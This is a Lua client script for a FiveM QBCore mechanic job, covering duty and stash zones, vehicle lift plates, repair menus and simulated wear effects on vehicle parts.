QBCore = exports['qb-core']:GetCoreObject()
VehicleStatus = {}

local ClosestPlate = nil
local PlayerJob = {}
local onDuty = false
local effectTimer = 0
local openingDoor = false

-- zone check
local isInsideDutyZone = false
local isInsideStashZone = false
local isInsideGarageZone = false
local isInsideVehiclePlateZone = false
local plateZones = {}
local plateTargetBoxID = 'plateTarget_'
local dutyTargetBoxID = 'dutyTarget'
local stashTargetBoxID = 'stashTarget'


-- Exports

local function GetVehicleStatusList(plate)
    local retval = nil
    if VehicleStatus[plate] ~= nil then
        retval = VehicleStatus[plate]
    end
    return retval
end

local function GetVehicleStatus(plate, part)
    local retval = nil
    if VehicleStatus[plate] ~= nil then
        retval = VehicleStatus[plate][part]
    end
    return retval
end

local function SetVehicleStatus(plate, part, level)
    TriggerServerEvent("vehiclemod:server:updatePart", plate, part, level)
end

exports('GetVehicleStatusList', GetVehicleStatusList)
exports('GetVehicleStatus', GetVehicleStatus)
exports('SetVehicleStatus', SetVehicleStatus)


-- Functions

local function DeleteTarget(id)
    if Config.UseTarget then
        exports['qb-target']:RemoveZone(id)
    else
        if Config.Targets[id] and Config.Targets[id].zone then
            Config.Targets[id].zone:destroy();
        end
    end
    
    Config.Targets[id] = nil
end

local function RegisterDutyTarget()
    local coords = Config.Locations['duty']
    local boxData = Config.Targets[dutyTargetBoxID] or {}

    if boxData and boxData.created then
        return
    end

    if PlayerJob.name ~= "mechanic" then
        return
    end

    local label = "Sign On Duty"
    if onDuty then
        label = "Sign Off Duty"
    end

    if Config.UseTarget then
        exports['qb-target']:AddBoxZone(dutyTargetBoxID, coords, 1.5, 1.5, {
            name = dutyTargetBoxID,
            heading = 0,
            debugPoly = false,
            minZ = coords.z - 1.0,
            maxZ = coords.z + 1.0,
        }, {
            options = {{
                type = "server",
                event = "QBCore:ToggleDuty",
                label = label,
            }},
            distance = 2.0
        })
    
        Config.Targets[dutyTargetBoxID] = {created = true}
    else
        local zone = BoxZone:Create(coords, 1.5, 1.5, {
            name = dutyTargetBoxID,
            heading = 0,
            debugPoly = false,
            minZ = coords.z - 1.0,
            maxZ = coords.z + 1.0,
        })
        zone:onPlayerInOut(function (isPointInside)
            if isPointInside then
                exports['qb-core']:DrawText("[E] " .. label, 'left')
            else
                exports['qb-core']:HideText()
            end
    
            isInsideDutyZone = isPointInside
        end)
    
        Config.Targets[dutyTargetBoxID] = {created = true, zone = zone}
    end
end

local function RegisterStashTarget()
    local coords = Config.Locations['stash']
    local boxData = Config.Targets[stashTargetBoxID] or {}

    if boxData and boxData.created then
        return
    end

    if PlayerJob.name ~= "mechanic" then
        return
    end

    if Config.UseTarget then
        exports['qb-target']:AddBoxZone(stashTargetBoxID, coords, 1.5, 1.5, {
            name = stashTargetBoxID,
            heading = 0,
            debugPoly = false,
            minZ = coords.z - 1.0,
            maxZ = coords.z + 1.0,
        }, {
            options = {{
                type = "client",
                event = "qb-mechanicjob:client:target:OpenStash",
                label = "Open Stash",
            }},
            distance = 2.0
        })
    
        Config.Targets[stashTargetBoxID] = {created = true}
    else
        local zone = BoxZone:Create(coords, 1.5, 1.5, {
            name = stashTargetBoxID,
            heading = 0,
            debugPoly = false,
            minZ = coords.z - 1.0,
            maxZ = coords.z + 1.0,
        })
        zone:onPlayerInOut(function (isPointInside)
            if isPointInside then
                exports['qb-core']:DrawText("[E] Open Stash", 'left')
            else
                exports['qb-core']:HideText()
            end
    
            isInsideStashZone = isPointInside
        end)
    
        Config.Targets[stashTargetBoxID] = {created = true, zone = zone}
    end
end

local function RegisterGarageZone()
    local coords = Config.Locations['vehicle']
    local vehicleZone = BoxZone:Create(vector3(coords.x, coords.y, coords.z), 5, 15, {
        name = 'vehicleZone',
        heading = 340.0,
        minZ = coords.z - 1.0,
        maxZ = coords.z + 5.0,
        debugPoly = false
    })

    vehicleZone:onPlayerInOut(function (isPointInside)
        if isPointInside and onDuty then
            local inVehicle = IsPedInAnyVehicle(PlayerPedId())
            if inVehicle then
                exports['qb-core']:DrawText('[E] Hide Vehicle', 'left')
            else
                exports['qb-core']:DrawText('[E] Get Vehicle', 'left')
            end
        else
            exports['qb-core']:HideText()
        end

        isInsideGarageZone = isPointInside
    end)
end

function DestroyVehiclePlateZone(id)
    if plateZones[id] then
        plateZones[id]:destroy()
        plateZones[id] = nil
    end
end

function RegisterVehiclePlateZone(id, plate)
    local coords = plate.coords
    local boxData = plate.boxData
    local plateZone = BoxZone:Create(vector3(coords.x, coords.y, coords.z), boxData.length, boxData.width, {
        name = plateTargetBoxID .. id,
        heading = boxData.heading,
        minZ = coords.z - 1.0,
        maxZ = coords.z + 3.0,
        debugPoly = boxData.debugPoly
    })

    plateZones[id] = plateZone

    plateZone:onPlayerInOut(function (isPointInside)
        if isPointInside and onDuty then
            if plate.AttachedVehicle then
                exports['qb-core']:DrawText('[E] Open Menu', 'left')
            else
                if IsPedInAnyVehicle(PlayerPedId()) then
                    exports['qb-core']:DrawText('[E] Work On Vehicle', 'left')
                end
            end
        else
            exports['qb-core']:HideText()
        end

        isInsideVehiclePlateZone = isPointInside
    end)
end

local function SetVehiclePlateZones()
    if Config.Plates and next(Config.Plates) then
        for id, plate in pairs(Config.Plates) do
            RegisterVehiclePlateZone(id, plate)
        end
    else
        print('No vehicle plates configured')
    end
end

local function loadAnimDict(dict)
    while (not HasAnimDictLoaded(dict)) do
        RequestAnimDict(dict)
        Wait(5)
    end
end

local function SetClosestPlate()
    local pos = GetEntityCoords(PlayerPedId(), true)
    local current = nil
    local dist = nil
    for id,_ in pairs(Config.Plates) do
        if current ~= nil then
            if #(pos - vector3(Config.Plates[id].coords.x, Config.Plates[id].coords.y, Config.Plates[id].coords.z)) < dist then
                current = id
                dist = #(pos - vector3(Config.Plates[id].coords.x, Config.Plates[id].coords.y, Config.Plates[id].coords.z))
            end
        else
            dist = #(pos - vector3(Config.Plates[id].coords.x, Config.Plates[id].coords.y, Config.Plates[id].coords.z))
            current = id
        end
    end
    ClosestPlate = current
end

local function ScrapAnim(time)
    time = time / 1000
    loadAnimDict("mp_car_bomb")
    TaskPlayAnim(PlayerPedId(), "mp_car_bomb", "car_bomb_mechanic" ,3.0, 3.0, -1, 16, 0, false, false, false)
    openingDoor = true
    CreateThread(function()
        while openingDoor do
            TaskPlayAnim(PlayerPedId(), "mp_car_bomb", "car_bomb_mechanic", 3.0, 3.0, -1, 16, 0, 0, 0, 0)
            Wait(2000)
            time = time - 2
            if time <= 0 then
                openingDoor = false
                StopAnimTask(PlayerPedId(), "mp_car_bomb", "car_bomb_mechanic", 1.0)
            end
        end
    end)
end

local function ApplyEffects(vehicle)
    local plate = QBCore.Functions.GetPlate(vehicle)
    if GetVehicleClass(vehicle) ~= 13 and GetVehicleClass(vehicle) ~= 21 and GetVehicleClass(vehicle) ~= 16 and GetVehicleClass(vehicle) ~= 15 and GetVehicleClass(vehicle) ~= 14 then
        if VehicleStatus[plate] ~= nil then
            local chance = math.random(1, 100)
            if VehicleStatus[plate]["radiator"] <= 80 and (chance >= 1 and chance <= 20) then
                local engineHealth = GetVehicleEngineHealth(vehicle)
                if VehicleStatus[plate]["radiator"] <= 80 and VehicleStatus[plate]["radiator"] >= 60 then
                    SetVehicleEngineHealth(vehicle, engineHealth - math.random(10, 15))
                elseif VehicleStatus[plate]["radiator"] <= 59 and VehicleStatus[plate]["radiator"] >= 40 then
                    SetVehicleEngineHealth(vehicle, engineHealth - math.random(15, 20))
                elseif VehicleStatus[plate]["radiator"] <= 39 and VehicleStatus[plate]["radiator"] >= 20 then
                    SetVehicleEngineHealth(vehicle, engineHealth - math.random(20, 30))
                elseif VehicleStatus[plate]["radiator"] <= 19 and VehicleStatus[plate]["radiator"] >= 6 then
                    SetVehicleEngineHealth(vehicle, engineHealth - math.random(30, 40))
                else
                    SetVehicleEngineHealth(vehicle, engineHealth - math.random(40, 50))
                end
            end

            if VehicleStatus[plate]["axle"] <= 80 and (chance >= 21 and chance <= 40) then
                if VehicleStatus[plate]["axle"] <= 80 and VehicleStatus[plate]["axle"] >= 60 then
                    for i=0,360 do
                        SetVehicleSteeringScale(vehicle,i)
                        Wait(5)
                    end
                elseif VehicleStatus[plate]["axle"] <= 59 and VehicleStatus[plate]["axle"] >= 40 then
                    for i=0,360 do
                        Wait(10)
                        SetVehicleSteeringScale(vehicle,i)
                    end
                elseif VehicleStatus[plate]["axle"] <= 39 and VehicleStatus[plate]["axle"] >= 20 then
                    for i=0,360 do
                        Wait(15)
                        SetVehicleSteeringScale(vehicle,i)
                    end
                elseif VehicleStatus[plate]["axle"] <= 19 and VehicleStatus[plate]["axle"] >= 6 then
                    for i=0,360 do
                        Wait(20)
                        SetVehicleSteeringScale(vehicle,i)
                    end
                else
                    for i=0,360 do
                        Wait(25)
                        SetVehicleSteeringScale(vehicle,i)
                    end
                end
            end

            if VehicleStatus[plate]["brakes"] <= 80 and (chance >= 41 and chance <= 60) then
                if VehicleStatus[plate]["brakes"] <= 80 and VehicleStatus[plate]["brakes"] >= 60 then
                    SetVehicleHandbrake(vehicle, true)
                    Wait(1000)
                    SetVehicleHandbrake(vehicle, false)
                elseif VehicleStatus[plate]["brakes"] <= 59 and VehicleStatus[plate]["brakes"] >= 40 then
                    SetVehicleHandbrake(vehicle, true)
                    Wait(3000)
                    SetVehicleHandbrake(vehicle, false)
                elseif VehicleStatus[plate]["brakes"] <= 39 and VehicleStatus[plate]["brakes"] >= 20 then
                    SetVehicleHandbrake(vehicle, true)
                    Wait(5000)
                    SetVehicleHandbrake(vehicle, false)
                elseif VehicleStatus[plate]["brakes"] <= 19 and VehicleStatus[plate]["brakes"] >= 6 then
                    SetVehicleHandbrake(vehicle, true)
                    Wait(7000)
                    SetVehicleHandbrake(vehicle, false)
                else
                    SetVehicleHandbrake(vehicle, true)
                    Wait(9000)
                    SetVehicleHandbrake(vehicle, false)
                end
            end

            if VehicleStatus[plate]["clutch"] <= 80 and (chance >= 61 and chance <= 80) then
                if VehicleStatus[plate]["clutch"] <= 80 and VehicleStatus[plate]["clutch"] >= 60 then
                    SetVehicleHandbrake(vehicle, true)
                    SetVehicleEngineOn(vehicle,0,0,1)
                    SetVehicleUndriveable(vehicle,true)
                    Wait(50)
                    SetVehicleEngineOn(vehicle,1,0,1)
                    SetVehicleUndriveable(vehicle,false)
                    for i=1,360 do
                        SetVehicleSteeringScale(vehicle, i)
                        Wait(5)
                    end
                    Wait(500)
                    SetVehicleHandbrake(vehicle, false)
                elseif VehicleStatus[plate]["clutch"] <= 59 and VehicleStatus[plate]["clutch"] >= 40 then
                    SetVehicleHandbrake(vehicle, true)
                    SetVehicleEngineOn(vehicle,0,0,1)
                    SetVehicleUndriveable(vehicle,true)
                    Wait(100)
                    SetVehicleEngineOn(vehicle,1,0,1)
                    SetVehicleUndriveable(vehicle,false)
                    for i=1,360 do
                        SetVehicleSteeringScale(vehicle, i)
                        Wait(5)
                    end
                    Wait(750)
                    SetVehicleHandbrake(vehicle, false)
                elseif VehicleStatus[plate]["clutch"] <= 39 and VehicleStatus[plate]["clutch"] >= 20 then
                    SetVehicleHandbrake(vehicle, true)
                    SetVehicleEngineOn(vehicle,0,0,1)
                    SetVehicleUndriveable(vehicle,true)
                    Wait(150)
                    SetVehicleEngineOn(vehicle,1,0,1)
                    SetVehicleUndriveable(vehicle,false)
                    for i=1,360 do
                        SetVehicleSteeringScale(vehicle, i)
                        Wait(5)
                    end
                    Wait(1000)
                    SetVehicleHandbrake(vehicle, false)
                elseif VehicleStatus[plate]["clutch"] <= 19 and VehicleStatus[plate]["clutch"] >= 6 then
                    SetVehicleHandbrake(vehicle, true)
                    SetVehicleEngineOn(vehicle,0,0,1)
                    SetVehicleUndriveable(vehicle,true)
                    Wait(200)
                    SetVehicleEngineOn(vehicle,1,0,1)
                    SetVehicleUndriveable(vehicle,false)
                    for i=1,360 do
                        SetVehicleSteeringScale(vehicle, i)
                        Wait(5)
                    end
                    Wait(1250)
                    SetVehicleHandbrake(vehicle, false)
                else
                    SetVehicleHandbrake(vehicle, true)
                    SetVehicleEngineOn(vehicle,0,0,1)
                    SetVehicleUndriveable(vehicle,true)
                    Wait(250)
                    SetVehicleEngineOn(vehicle,1,0,1)
                    SetVehicleUndriveable(vehicle,false)
                    for i=1,360 do
                        SetVehicleSteeringScale(vehicle, i)
                        Wait(5)
                    end
                    Wait(1500)
                    SetVehicleHandbrake(vehicle, false)
                end
            end

            if VehicleStatus[plate]["fuel"] <= 80 and (chance >= 81 and chance <= 100) then
                local fuel = exports['ps-fuel']:GetFuel(vehicle)
                if VehicleStatus[plate]["fuel"] <= 80 and VehicleStatus[plate]["fuel"] >= 60 then
                    exports['ps-fuel']:SetFuel(vehicle, fuel - 2.0)
                elseif VehicleStatus[plate]["fuel"] <= 59 and VehicleStatus[plate]["fuel"] >= 40 then
                    exports['ps-fuel']:SetFuel(vehicle, fuel - 4.0)
                elseif VehicleStatus[plate]["fuel"] <= 39 and VehicleStatus[plate]["fuel"] >= 20 then
                    exports['ps-fuel']:SetFuel(vehicle, fuel - 6.0)
                elseif VehicleStatus[plate]["fuel"] <= 19 and VehicleStatus[plate]["fuel"] >= 6 then
                    exports['ps-fuel']:SetFuel(vehicle, fuel - 8.0)
                else
                    exports['ps-fuel']:SetFuel(vehicle, fuel - 10.0)
                end
            end
        end
    end
end

local function round(num, numDecimalPlaces)
    return tonumber(string.format("%." .. (numDecimalPlaces or 1) .. "f", num))
end

local function SendStatusMessage(statusList)
    if statusList ~= nil then
        TriggerEvent('chat:addMessage', {
            template = '<div class="chat-message normal"><div class="chat-message-body"><strong>{0}:</strong><br><br> <strong>'.. Config.ValuesLabels["engine"] ..' (engine):</strong> {1} <br><strong>'.. Config.ValuesLabels["body"] ..' (body):</strong> {2} <br><strong>'.. Config.ValuesLabels["radiator"] ..' (radiator):</strong> {3} <br><strong>'.. Config.ValuesLabels["axle"] ..' (axle):</strong> {4}<br><strong>'.. Config.ValuesLabels["brakes"] ..' (brakes):</strong> {5}<br><strong>'.. Config.ValuesLabels["clutch"] ..' (clutch):</strong> {6}<br><strong>'.. Config.ValuesLabels["fuel"] ..' (fuel):</strong> {7}</div></div>',
            args = {'Vehicle Status', round(statusList["engine"]) .. "/" .. Config.MaxStatusValues["engine"] .. " ("..QBCore.Shared.Items["advancedrepairkit"]["label"]..")", round(statusList["body"]) .. "/" .. Config.MaxStatusValues["body"] .. " ("..QBCore.Shared.Items[Config.RepairCost["body"]]["label"]..")", round(statusList["radiator"]) .. "/" .. Config.MaxStatusValues["radiator"] .. ".0 ("..QBCore.Shared.Items[Config.RepairCost["radiator"]]["label"]..")", round(statusList["axle"]) .. "/" .. Config.MaxStatusValues["axle"] .. ".0 ("..QBCore.Shared.Items[Config.RepairCost["axle"]]["label"]..")", round(statusList["brakes"]) .. "/" .. Config.MaxStatusValues["brakes"] .. ".0 ("..QBCore.Shared.Items[Config.RepairCost["brakes"]]["label"]..")", round(statusList["clutch"]) .. "/" .. Config.MaxStatusValues["clutch"] .. ".0 ("..QBCore.Shared.Items[Config.RepairCost["clutch"]]["label"]..")", round(statusList["fuel"]) .. "/" .. Config.MaxStatusValues["fuel"] .. ".0 ("..QBCore.Shared.Items[Config.RepairCost["fuel"]]["label"]..")"}
        })
    end
end

local function OpenMenu()
    local openMenu = {
        {
            header = "Vehicle Options",
            isMenuHeader = true
        }, {
            header = "Disconnect Vehicle",
            txt = "Unattach Vehicle in Lift",
            params = {
                event = "qb-mechanicjob:client:UnattachVehicle",
            }
        }, {
            header = "Check Status",
            txt = "Check Vehicle Status",
            params = {
                event = "qb-mechanicjob:client:CheckStatus",
                args = {
                    number = 1,
                }
            }
        }, {
            header = "Vehicle Parts",
            txt = "Repair Vehicle Parts",
            params = {
                event = "qb-mechanicjob:client:PartsMenu",
                args = {
                    number = 1,
                }
            }
        }, {
            header = "⬅ Close Menu",
            txt = "",
            params = {
                event = "qb-mechanicjob:client:target:CloseMenu",
            }
        },
    }
    exports['qb-menu']:openMenu(openMenu)
end

local function PartsMenu()
    local plate = QBCore.Functions.GetPlate(Config.Plates[ClosestPlate].AttachedVehicle)
    if VehicleStatus[plate] ~= nil then
        local vehicleMenu = {
            {
                header = "Status",
                isMenuHeader = true
            }
        }
        for k,v in pairs(Config.ValuesLabels) do
            if math.ceil(VehicleStatus[plate][k]) ~= Config.MaxStatusValues[k] then
                local percentage = math.ceil(VehicleStatus[plate][k])
                if percentage > 100 then
                    percentage = math.ceil(VehicleStatus[plate][k]) / 10
                end
                vehicleMenu[#vehicleMenu+1] = {
                    header = v,
                    txt = "Status: " .. percentage .. ".0% / 100.0%",
                    params = {
                        event = "qb-mechanicjob:client:PartMenu",
                        args = {
                            name = v,
                            parts = k
                        }
                    }
                }
            else
                local percentage = math.ceil(Config.MaxStatusValues[k])
                if percentage > 100 then
                    percentage = math.ceil(Config.MaxStatusValues[k]) / 10
                end
                vehicleMenu[#vehicleMenu+1] = {
                    header = v,
                    txt = "Status: " .. percentage .. ".0% / 100.0%",
                    params = {
                        event = "qb-mechanicjob:client:NoDamage",
                    }
                }
            end
        end
        vehicleMenu[#vehicleMenu+1] = {
            header = "⬅ Close Menu",
            txt = "",
            params = {
                event = "qb-menu:client:closeMenu"
            }
        }
        exports['qb-menu']:openMenu(vehicleMenu)
    end

end

local function PartMenu(data)
    local partName = data.name
    local part = data.parts
    local TestMenu1 = {
        {
            header = "Part Menu",
            isMenuHeader = true
        },
        {
            header = ""..partName.."",
            txt = "Repair : "..QBCore.Shared.Items[Config.RepairCostAmount[part].item]["label"].." "..Config.RepairCostAmount[part].costs.."x",
            params = {
                event = "qb-mechanicjob:client:RepairPart",
                args = {
                    part = part,
                }
            }
        },
        {
            header = "⬅ Back Menu",
            txt = "Back to parts menu",
            params = {
                event = "qb-mechanicjob:client:PartsMenu",
            }
        },
        {
            header = "⬅ Close Menu",
            txt = "",
            params = {
                event = "qb-menu:client:closeMenu",
            }
        },
    }

    exports['qb-menu']:openMenu(TestMenu1)
end

local function NoDamage()
    local noDamage = {
        {
            header = "No Damage",
            isMenuHeader = true
        },
        {
            header = "Back Menu",
            txt = "There Is No Damage To This Part!",
            params = {
                event = "qb-mechanicjob:client:PartsMenu",
            }
        },
        {
            header = "⬅ Close Menu",
            txt = "",
            params = {
                event = "qb-menu:client:closeMenu",
            }
        },
    }
    exports['qb-menu']:openMenu(noDamage)
end

local function UnattachVehicle()
    DoScreenFadeOut(150)
    Wait(150)
    FreezeEntityPosition(Config.Plates[ClosestPlate].AttachedVehicle, false)
    SetEntityCoords(Config.Plates[ClosestPlate].AttachedVehicle, Config.Plates[ClosestPlate].coords.x, Config.Plates[ClosestPlate].coords.y, Config.Plates[ClosestPlate].coords.z)
    SetEntityHeading(Config.Plates[ClosestPlate].AttachedVehicle, Config.Plates[ClosestPlate].coords.w)
    TaskWarpPedIntoVehicle(PlayerPedId(), Config.Plates[ClosestPlate].AttachedVehicle, -1)
    Wait(500)
    DoScreenFadeIn(250)
    Config.Plates[ClosestPlate].AttachedVehicle = nil
    TriggerServerEvent('qb-vehicletuning:server:SetAttachedVehicle', false, ClosestPlate)

    DestroyVehiclePlateZone(ClosestPlate)
    RegisterVehiclePlateZone(ClosestPlate, Config.Plates[ClosestPlate])
    
end

local function SpawnListVehicle(model)
    local coords = {
        x = Config.Locations["vehicle"].x,
        y = Config.Locations["vehicle"].y,
        z = Config.Locations["vehicle"].z,
        w = Config.Locations["vehicle"].w,
    }

    QBCore.Functions.SpawnVehicle(model, function(veh)
        SetVehicleNumberPlateText(veh, "ACBV"..tostring(math.random(1000, 9999)))
        SetEntityHeading(veh, coords.w)
        exports['ps-fuel']:SetFuel(veh, 100.0)
        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1)
        TriggerEvent("vehiclekeys:client:SetOwner", QBCore.Functions.GetPlate(veh))
        SetVehicleEngineOn(veh, true, true)
    end, coords, true)
end

local function VehicleList()
    local vehicleMenu = {
        {
            header = "Vehicle List",
            isMenuHeader = true
        }
    }
    for k,v in pairs(Config.Vehicles) do
        vehicleMenu[#vehicleMenu+1] = {
            header = v,
            txt = "Vehicle: "..v.."",
            params = {
                event = "qb-mechanicjob:client:SpawnListVehicle",
                args = {
                    headername = v,
                    spawnName = k
                }
            }
        }
    end
    vehicleMenu[#vehicleMenu+1] = {
        header = "⬅ Close Menu",
        txt = "",
        params = {
            event = "qb-menu:client:closeMenu"
        }

    }
    exports['qb-menu']:openMenu(vehicleMenu)
end

local function CheckStatus()
    local plate = QBCore.Functions.GetPlate(Config.Plates[ClosestPlate].AttachedVehicle)
    SendStatusMessage(VehicleStatus[plate])
end

local function RepairPart(part)
    local PartData = Config.RepairCostAmount[part]
    local hasitem = false
    local indx = 0
    local countitem = 0
    QBCore.Functions.TriggerCallback('qb-inventory:server:GetStashItems', function(StashItems)
        for k,v in pairs(StashItems) do
            if v.name == PartData.item then
                hasitem = true
                if v.amount >= PartData.costs then
                    countitem = v.amount
                    indx = k
                end
            end
        end
        if hasitem and countitem >= PartData.costs then
            TriggerEvent('animations:client:EmoteCommandStart', {"mechanic"})
            QBCore.Functions.Progressbar("repair_part", "Repairing " ..Config.ValuesLabels[part], math.random(5000, 10000), false, true, {
                disableMovement = true,
                disableCarMovement = true,
                disableMouse = false,
                disableCombat = true,
            }, {}, {}, {}, function() -- Done
                TriggerEvent('animations:client:EmoteCommandStart', {"c"})
                if (countitem - PartData.costs) <= 0 then
                    StashItems[indx] = nil
                else
                    countitem = (countitem - PartData.costs)
                    StashItems[indx].amount = countitem
                end
                TriggerEvent('qb-vehicletuning:client:RepaireeePart', part)
                TriggerServerEvent('qb-inventory:server:SaveStashItems', "mechanicstash", StashItems)
                SetTimeout(250, function()
                    PartsMenu()
                end)
            end, function()
                QBCore.Functions.Notify("Repair Cancelled", "error")
            end)
        else
            QBCore.Functions.Notify('There Are Not Enough Materials In The Safe', 'error')
        end
    end, "mechanicstash")
end


-- Events

RegisterNetEvent("qb-mechanicjob:client:UnattachVehicle",function()
    UnattachVehicle()
end)

RegisterNetEvent("qb-mechanicjob:client:PartsMenu",function()
    PartsMenu()
end)

RegisterNetEvent("qb-mechanicjob:client:PartMenu",function(data)
    PartMenu(data)
end)

RegisterNetEvent("qb-mechanicjob:client:NoDamage",function()
    NoDamage()
end)

RegisterNetEvent("qb-mechanicjob:client:CheckStatus",function()
    CheckStatus()
end)

RegisterNetEvent("qb-mechanicjob:client:SpawnListVehicle",function(data)
    local vehicleSpawnName = data.spawnName
    SpawnListVehicle(vehicleSpawnName)
end)

RegisterNetEvent("qb-mechanicjob:client:RepairPart",function(data)
    local partData = data.part
    RepairPart(partData)
end)

RegisterNetEvent('QBCore:Client:OnPlayerLoaded', function()
    QBCore.Functions.GetPlayerData(function(PlayerData)
        PlayerJob = PlayerData.job
        if PlayerData.job.onduty then
            if PlayerData.job.name == "mechanic" then
                TriggerServerEvent("QBCore:ToggleDuty")
            end
        end
    end)
    QBCore.Functions.TriggerCallback('qb-vehicletuning:server:GetAttachedVehicle', function(plates)
        for k, v in pairs(plates) do
            Config.Plates[k].AttachedVehicle = v.AttachedVehicle
        end
    end)

    QBCore.Functions.TriggerCallback('qb-vehicletuning:server:GetDrivingDistances', function(retval)
        DrivingDistance = retval
    end)
end)

RegisterNetEvent('QBCore:Client:OnJobUpdate', function(JobInfo)
    PlayerJob = JobInfo
    onDuty = PlayerJob.onduty

    DeleteTarget(dutyTargetBoxID)
    DeleteTarget(stashTargetBoxID)
    RegisterDutyTarget()

    if onDuty then
        RegisterStashTarget()
    end
end)

RegisterNetEvent('QBCore:Client:SetDuty', function(duty)
    onDuty = duty
    
    DeleteTarget(dutyTargetBoxID)
    DeleteTarget(stashTargetBoxID)
    RegisterDutyTarget()

    if onDuty then
        RegisterStashTarget()
    end
end)

RegisterNetEvent('qb-vehicletuning:client:SetAttachedVehicle', function(veh, key)
    if veh ~= false then
        Config.Plates[key].AttachedVehicle = veh
    else
        Config.Plates[key].AttachedVehicle = nil
    end
end)

RegisterNetEvent('qb-vehicletuning:client:RepaireeePart', function(part)
    local veh = Config.Plates[ClosestPlate].AttachedVehicle
    local plate = QBCore.Functions.GetPlate(veh)
    if part == "engine" then
        SetVehicleEngineHealth(veh, Config.MaxStatusValues[part])
        TriggerServerEvent("vehiclemod:server:updatePart", plate, "engine", Config.MaxStatusValues[part])
    elseif part == "body" then
        local enhealth = GetVehicleEngineHealth(veh)
        SetVehicleBodyHealth(veh, Config.MaxStatusValues[part])
        TriggerServerEvent("vehiclemod:server:updatePart", plate, "body", Config.MaxStatusValues[part])
        SetVehicleFixed(veh)
        SetVehicleEngineHealth(veh, enhealth)
    else
        TriggerServerEvent("vehiclemod:server:updatePart", plate, part, Config.MaxStatusValues[part])
    end
    QBCore.Functions.Notify("The "..Config.ValuesLabels[part].." Is Repaired!")
end)

RegisterNetEvent('vehiclemod:client:setVehicleStatus', function(plate, status)
    VehicleStatus[plate] = status
end)

RegisterNetEvent('vehiclemod:client:getVehicleStatus', function()
    if not (IsPedInAnyVehicle(PlayerPedId(), false)) then
        local veh = GetVehiclePedIsIn(PlayerPedId(), true)
        if veh ~= nil and veh ~= 0 then
            local vehpos = GetEntityCoords(veh)
            local pos = GetEntityCoords(PlayerPedId())
            if #(pos - vehpos) < 5.0 then
                if not IsThisModelABicycle(GetEntityModel(veh)) then
                    local plate = QBCore.Functions.GetPlate(veh)
                    if VehicleStatus[plate] ~= nil then
                        SendStatusMessage(VehicleStatus[plate])
                    else
                        QBCore.Functions.Notify("Status Unknown", "error")
                    end
                else
                    QBCore.Functions.Notify("Not A Valid Vehicle", "error")
                end
            else
                QBCore.Functions.Notify("You Are Not Close Enough To The Vehicle", "error")
            end
        else
            QBCore.Functions.Notify("You Must Be In The Vehicle First", "error")
        end
    else
        QBCore.Functions.Notify("You Must Be Outside The Vehicle", "error")
    end
end)

RegisterNetEvent('vehiclemod:client:fixEverything', function()
    if (IsPedInAnyVehicle(PlayerPedId(), false)) then
        local veh = GetVehiclePedIsIn(PlayerPedId(),false)
        if not IsThisModelABicycle(GetEntityModel(veh)) and GetPedInVehicleSeat(veh, -1) == PlayerPedId() then
            local plate = QBCore.Functions.GetPlate(veh)
            TriggerServerEvent("vehiclemod:server:fixEverything", plate)
        else
            QBCore.Functions.Notify("You Are Not The Driver Or On A Bicycle", "error")
        end
    else
        QBCore.Functions.Notify("You Are Not In A Vehicle", "error")
    end
end)

RegisterNetEvent('vehiclemod:client:setPartLevel', function(part, level)
    if (IsPedInAnyVehicle(PlayerPedId(), false)) then
        local veh = GetVehiclePedIsIn(PlayerPedId(),false)
        if not IsThisModelABicycle(GetEntityModel(veh)) and GetPedInVehicleSeat(veh, -1) == PlayerPedId() then
            local plate = QBCore.Functions.GetPlate(veh)
            if part == "engine" then
                SetVehicleEngineHealth(veh, level)
                TriggerServerEvent("vehiclemod:server:updatePart", plate, "engine", GetVehicleEngineHealth(veh))
            elseif part == "body" then
                SetVehicleBodyHealth(veh, level)
                TriggerServerEvent("vehiclemod:server:updatePart", plate, "body", GetVehicleBodyHealth(veh))
            else
                TriggerServerEvent("vehiclemod:server:updatePart", plate, part, level)
            end
        else
            QBCore.Functions.Notify("You Are Not The Driver Or On A Bicycle", "error")
        end
    else
        QBCore.Functions.Notify("You Are Not The Driver Or On A Bicycle", "error")
    end
end)

RegisterNetEvent('vehiclemod:client:repairPart', function(part, level, needAmount)
    if not IsPedInAnyVehicle(PlayerPedId(), false) then
        local veh = GetVehiclePedIsIn(PlayerPedId(), true)
        if veh ~= nil and veh ~= 0 then
            local vehpos = GetEntityCoords(veh)
            local pos = GetEntityCoords(PlayerPedId())
            if #(pos - vehpos) < 5.0 then
                if not IsThisModelABicycle(GetEntityModel(veh)) then
                    local plate = QBCore.Functions.GetPlate(veh)
                    if VehicleStatus[plate] ~= nil and VehicleStatus[plate][part] ~= nil then
                        local lockpickTime = (1000 * level)
                        if part == "body" then
                            lockpickTime = lockpickTime / 10
                        end
                        ScrapAnim(lockpickTime)
                        QBCore.Functions.Progressbar("repair_advanced", "Repair Vehicle", lockpickTime, false, true, {
                            disableMovement = true,
                            disableCarMovement = true,
                            disableMouse = false,
                            disableCombat = true,
                        }, {
                            animDict = "mp_car_bomb",
                            anim = "car_bomb_mechanic",
                            flags = 16,
                        }, {}, {}, function() -- Done
                            openingDoor = false
                            ClearPedTasks(PlayerPedId())
                            if part == "body" then
                                local enhealth = GetVehicleEngineHealth(veh)
                                SetVehicleBodyHealth(veh, GetVehicleBodyHealth(veh) + level)
                                SetVehicleFixed(veh)
                                SetVehicleEngineHealth(veh, enhealth)
                                TriggerServerEvent("vehiclemod:server:updatePart", plate, part, GetVehicleBodyHealth(veh))
                                TriggerServerEvent("QBCore:Server:RemoveItem", Config.RepairCost[part], needAmount)
                                TriggerEvent("inventory:client:ItemBox", QBCore.Shared.Items[Config.RepairCost[part]], "remove")
                            elseif part ~= "engine" then
                                TriggerServerEvent("vehiclemod:server:updatePart", plate, part, GetVehicleStatus(plate, part) + level)
                                TriggerServerEvent("QBCore:Server:RemoveItem", Config.RepairCost[part], level)
                                TriggerEvent("inventory:client:ItemBox", QBCore.Shared.Items[Config.RepairCost[part]], "remove")
                            end
                        end, function() -- Cancel
                            openingDoor = false
                            ClearPedTasks(PlayerPedId())
                            QBCore.Functions.Notify("Process Canceled", "error")
                        end)
                    else
                        QBCore.Functions.Notify("Not A Valid Part", "error")
                    end
                else
                    QBCore.Functions.Notify("Not A Valid Vehicle", "error")
                end
            else
                QBCore.Functions.Notify("You Are Not Close Enough To The Vehicle", "error")
            end
        else
            QBCore.Functions.Notify("You Must Be In The Vehicle First", "error")
        end
    else
        QBCore.Functions.Notify("Youre Not In a Vehicle", "error")
    end
end)

